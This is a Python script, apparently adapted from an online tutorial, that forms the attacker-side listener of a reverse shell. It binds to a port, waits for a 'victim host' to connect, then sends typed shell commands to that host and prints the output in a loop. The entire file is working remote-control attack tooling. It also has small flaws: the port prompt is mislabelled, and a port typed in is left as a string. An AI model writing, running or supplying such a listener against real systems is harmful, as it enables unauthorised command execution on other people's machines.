"""Reverse Shell Tool that will execute a shell based on the victim host OS
Influenced by thepythoncode.com as usual.
"""

# Imports
import socket

# User input for Local Host, port, and Constants for buffer size to send message, and a separator string for sending more than 1 message at a time
LHOST = input("Enter Local Host IP, default: 0.0.0.0: ") or "0.0.0.0" # all addresses on local machine
LPORT = input("Enter Local Host IP, default: 4444: ") or 4444
BUFFER_SIZE = 1024 * 256 # 256KB max size
SEPARATOR = "<sep>"

s = socket.socket() # Socket object for communication
s.bind((LHOST, LPORT)) # bind socket to IP addresses of this host

# Listen for connections
s.listen(5)
print(f"Listening on {LHOST}:{LPORT}...")

# Accept incoming connections from clients
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!") # [0] = rhost [1] = rport

# Print current working directory of rhost
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory", cwd)

# Send shell commands
while True:
    # Get command from input
    command = input(f"{cwd} $> ")
    if not command.strip(): # if command is empty do nothing
        continue
    # Send command to rhost
    client_socket.send(command.encode())
    if command.lower() == "exit": # If command is exit, break the loop and exit
        break
    # Get command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # Split command output and directory
    results, cwd = output.split(SEPARATOR)
    # Print output
    print(results)